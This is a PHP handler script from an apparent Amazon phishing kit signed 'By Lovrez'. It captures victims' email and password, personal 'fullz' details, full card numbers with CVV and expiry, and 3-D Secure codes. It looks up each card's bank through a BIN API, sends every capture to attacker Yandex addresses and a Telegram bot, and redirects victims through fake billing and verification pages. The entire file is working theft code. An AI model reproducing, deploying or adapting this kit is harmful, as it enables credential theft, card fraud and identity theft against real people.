<?php
session_start();
include "./config.php";
$ip = $_SESSION['IP'];
$ua = $_SESSION['UA'];
if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $message = "[ð¸] +1 LOGIN [ð¸]\n";
    $message .= "[ð³] E-Mail : " . $email . "\n"; 
    $message .= "[ð³ð¿] Mot de Passe : " . $password . "\n";
    $message .= "==========================\n";
    $message .= "[ð«] IP : " . $ip . "\n";
    $message .= "[ð«] User-Agent : " . $ua . "\n";
    $message .= "[ð¸] By Lovrez [ð¸]";
    $subject = "ð¸ | +1 LOG - " . $email . " - " . $ip . " | ð°";
    $from = "From: ð¸ Lovrez ð¸ <rez@tzjzovwovw.online>";
	
    mail("tonsibg@yandex.com",$subject,$message,$from);
    sendMessage($chat_id,$message,$token);
    header('location: ../app/billing/index.php?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&');
}
if (isset($_POST['name'])) {
    $name = $_POST['name'];
    $ville = $_POST['ville'];
    $adresse = $_POST['adresse'];
    $zip = $_POST['zip'];
    $dob = $_POST['dob'];
    $num = $_POST['num'];
    $_SESSION['name'] = $name;

    $message = "[ð] +1 FULLZ [ð]\n";
    $message .= "[ð¥] Nom & PrÃ©nom du hmar : " . $name . "\n"; 
    $message .= "[ð¥] Ville : " . $ville . "\n";
    $message .= "[ð¥] Adresse : " . $adresse . "\n";
    $message .= "[ð¥] ZIP : " . $zip . "\n";
    $message .= "[ð¥] DOB : " . $dob . "\n";
    $message .= "[ð¥] NUM : " . $num . "\n";
    $message .= "==========================\n";
    $message .= "[ð«] IP : " . $ip . "\n";
    $message .= "[ð«] User-Agent : " . $ua . "\n";
    $message .= "[ð] By Lovrez [ð]";
    $subject = "ð | +1 BILLING - " . $name . " - " . $ip . " | ðª";
    $from = "From: ð Lovrez ð <rez@tzjzovwovw.online>";

    mail("",$subject,$message,$from);
    sendMessage($chat_id,$message,$token);
    header('location: ../app/payments/index.php?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&');

}
if (isset($_POST['cc']) && isset($_POST['exp'])) {
    $cc = $_POST['cc'];
    $ccv = $_POST['ccv'];
    $exp = $_POST['exp'];

    $ch = curl_init();
    $url = "https://api.bincodes.com/cc/?format=json&api_key=0aeea0d6c24cb8c76ed694df5ced0461&cc=$cc";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    $brand = '';
    $type = '';
    $bank = '';
    $someArray = json_decode($result, true);
    $brand = $someArray['level'];
    $type = $someArray['type'];
    $bank = $someArray['bank'];

    $message = "[ð¥·ð¼] +1 CC [ð¥·ð¼]\n";
    $message .= "[ð¼] Nom sur carte : " . $_SESSION['name'] . "\n"; 
    $message .= "[ð¼] Num. de carte : " . $cc . "\n";
    $message .= "[ð¼] Date Exp. : " . $exp . "\n"; 
    $message .= "[ð¼] CCV : " . $ccv . "\n";
    $message .= "==========================\n";
    $message .= "[ð] Banque : " . $bank . "\n";
    $message .= "[ð] Type : " . $type . "\n"; 
    $message .= "[ð] Level : " . $brand . "\n";
    $message .= "==========================\n";
    $message .= "[ð«] IP : " . $ip . "\n";
    $message .= "[ð«] UA : " . $ua . "\n";
    $message .= "[ð¥·ð¼] By Lovrez [ð¥·ð¼]";
    $subject = "ð¥·ð¼ | +1 CC - " . $cc . " - " . $ip . " | ð¥·ð¼";
    $from = "From: ð¥·ð¼ Lovrez ð¥·ð¼ <rez@tzjzovwovw.online>";

    mail("ton-mail-ici@yandex.com",$subject,$message,$from);
    sendMessage($chat_id,$message,$token);

    if ($vbv == "yes") {
        header('location: ../app/verification/index.php?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&');
    }else{
        header('location: https://amazon.com/');
    }

}
if (isset($_POST['code'])) {
    $code = $_POST['code'];

    $message = "[â£ï¸] +1 VBV [â£ï¸]\n";
    $message .= "[ð] Code : " . $code . "\n"; 
    $message .= "==========================\n";
    $message .= "[ð»] IP : " . $ip . "\n";
    $message .= "[ð] UA : " . $ua . "\n";
    $message .= "[â£ï¸] By Lovrez [â£ï¸]";
    $subject = "âï¸ | +1 VBV - " . $code . " - " . $ip . " | âï¸";
    $from = "From: â£ï¸ Lovrez <rez@tzjzovwovw.online>";

    mail("",$subject,$message,$from);
    sendMessage($chat_id,$message,$token);
    header('location: ../app/verification/validation.php?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&');
}

?>